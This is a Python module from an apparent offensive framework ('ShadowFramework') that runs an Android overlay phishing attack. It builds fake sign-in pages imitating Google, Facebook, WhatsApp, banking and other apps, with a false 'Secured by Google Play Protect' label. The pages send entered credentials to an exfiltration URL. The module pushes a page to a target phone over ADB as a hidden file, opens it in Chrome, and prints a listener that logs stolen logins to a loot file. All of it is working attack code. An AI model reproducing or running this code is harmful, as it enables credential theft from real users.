"""
ShadowFramework — Android Overlay Attack
Launches real overlay windows via ADB for phishing credential capture.
"""
import subprocess
import os
from pathlib import Path
from rich.console import Console
from utils.logger import log_action

console = Console()

def _adb(dev, *args, timeout=10):
    cmd = ['adb', '-s', dev] + list(args)
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip(), r.stderr.strip(), r.returncode
    except subprocess.TimeoutExpired:
        return '', 'timeout', 1


PHISH_HTML = '''<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: -apple-system, sans-serif; background: #f5f5f5; display:flex; justify-content:center; align-items:center; min-height:100vh; }
.card { background: white; border-radius: 16px; padding: 32px; width: 90%; max-width: 360px; box-shadow: 0 4px 24px rgba(0,0,0,.12); }
.logo { text-align:center; margin-bottom:20px; }
.logo img { width:48px; height:48px; border-radius:12px; }
.logo h3 { margin-top:8px; font-size:18px; color:#1a1a1a; }
.logo p { font-size:13px; color:#666; }
input { width:100%; padding:14px; margin:8px 0; border:1px solid #ddd; border-radius:10px; font-size:15px; }
input:focus { border-color: #4285f4; outline:none; }
.btn { width:100%; padding:14px; background:TARGET_COLOR; color:white; border:none; border-radius:10px; font-size:16px; font-weight:600; cursor:pointer; margin-top:12px; }
</style></head><body>
<div class="card">
<div class="logo"><h3>TARGET_NAME</h3><p>Sign in to continue</p></div>
<form id="f" onsubmit="return send()">
<input type="email" id="u" placeholder="Email or phone" required>
<input type="password" id="p" placeholder="Password" required>
<button type="submit" class="btn">Sign In</button>
</form>
<p style="text-align:center;margin-top:16px;font-size:12px;color:#999">Secured by Google Play Protect</p>
</div>
<script>
function send() {
    var u=document.getElementById('u').value, p=document.getElementById('p').value;
    var x=new XMLHttpRequest();
    x.open('POST','EXFIL_URL',true);
    x.setRequestHeader('Content-Type','application/json');
    x.send(JSON.stringify({app:'TARGET_NAME',user:u,pass:p,ts:Date.now()}));
    document.querySelector('.card').innerHTML='<div style="text-align:center;padding:40px"><p style="font-size:16px">✓ Signed in</p><p style="color:#666;margin-top:8px">Loading...</p></div>';
    setTimeout(function(){window.close()},2000);
    return false;
}
</script></body></html>'''

# App-specific themes
TEMPLATES = {
    'google': ('Google', '#4285f4'),
    'facebook': ('Facebook', '#1877f2'),
    'instagram': ('Instagram', '#e4405f'),
    'whatsapp': ('WhatsApp', '#25d366'),
    'twitter': ('X (Twitter)', '#000000'),
    'tiktok': ('TikTok', '#010101'),
    'banking': ('Mobile Banking', '#1a237e'),
    'playstore': ('Google Play', '#01875f'),
}


class Module:
    MODULE_INFO = {
        'name': 'post/android/overlay_attack',
        'description': 'Generates and deploys overlay phishing pages that mimic popular apps.',
        'options': {
            'DEVICE_ID': 'Target device serial',
            'TEMPLATE':  'App to mimic: google, facebook, instagram, whatsapp, twitter, banking [default: google]',
            'EXFIL_URL': 'Server to receive credentials [default: http://127.0.0.1:8080/creds]',
            'TRIGGER_PKG': 'Launch overlay when this package opens [optional]',
        }
    }

    def __init__(self, framework):
        self.framework = framework

    def run(self):
        device_id = self.framework.options.get('DEVICE_ID', '')
        template = self.framework.options.get('TEMPLATE', 'google').lower()
        exfil_url = self.framework.options.get('EXFIL_URL', 'http://127.0.0.1:8080/creds')
        trigger = self.framework.options.get('TRIGGER_PKG', '')

        if not device_id:
            out, _, _ = _adb('', 'devices')
            for line in out.splitlines()[1:]:
                if '\tdevice' in line:
                    device_id = line.split('\t')[0]
                    break
        if not device_id:
            console.print("[red][!] No device found.[/red]")
            return

        console.print(f"[cyan][*] Overlay attack setup on {device_id}...[/cyan]")
        log_action(f"Overlay attack on {device_id} (template: {template})")

        # Check overlay permission
        overlay_perm, _, _ = _adb(device_id, 'shell', 'settings', 'get', 'secure', 'package_verifier_user_consent')
        console.print(f"  [dim]User consent level: {overlay_perm}[/dim]")

        # Generate phishing page
        if template not in TEMPLATES:
            console.print(f"[yellow]  Unknown template '{template}', using 'google'[/yellow]")
            template = 'google'

        app_name, color = TEMPLATES[template]
        html = PHISH_HTML.replace('TARGET_NAME', app_name)
        html = html.replace('TARGET_COLOR', color)
        html = html.replace('EXFIL_URL', exfil_url)

        # Save locally
        out_dir = Path('loot/overlays')
        out_dir.mkdir(parents=True, exist_ok=True)
        local_file = out_dir / f'{template}_overlay.html'
        local_file.write_text(html)
        console.print(f"[green][+] Overlay page saved: {local_file}[/green]")

        # Push to device
        remote_path = f'/sdcard/Download/.{template}_login.html'
        _adb(device_id, 'push', str(local_file), remote_path)
        console.print(f"[cyan][*] Pushed to {remote_path}[/cyan]")

        # Launch as fullscreen browser overlay
        _adb(device_id, 'shell', 'am', 'start', '-a', 'android.intent.action.VIEW',
             '-d', f'file://{remote_path}',
             '--ez', 'create_new_tab', 'true',
             '-n', 'com.android.chrome/com.google.android.apps.chrome.Main')
        
        console.print(f"[yellow][*] Overlay launched as Chrome tab.[/yellow]")
        console.print(f"\n[bold]Setup exfil listener:[/bold]")
        console.print(f"[dim]  python3 -c \"")
        console.print(f"  from http.server import HTTPServer, BaseHTTPRequestHandler")
        console.print(f"  import json")
        console.print(f"  class H(BaseHTTPRequestHandler):")
        console.print(f"    def do_POST(self):")
        console.print(f"      data = self.rfile.read(int(self.headers['Content-Length']))")
        console.print(f"      creds = json.loads(data)")
        console.print(f"      print(f'CAPTURED: {{creds}}')")
        console.print(f"      open('loot/creds.json','a').write(json.dumps(creds)+'\\n')")
        console.print(f"      self.send_response(200); self.end_headers()")
        console.print(f"  HTTPServer(('0.0.0.0', 8080), H).serve_forever()\"[/dim]")
        console.print(f"\n[bold green][+] Overlay deployed. Waiting for victim interaction.[/bold green]")
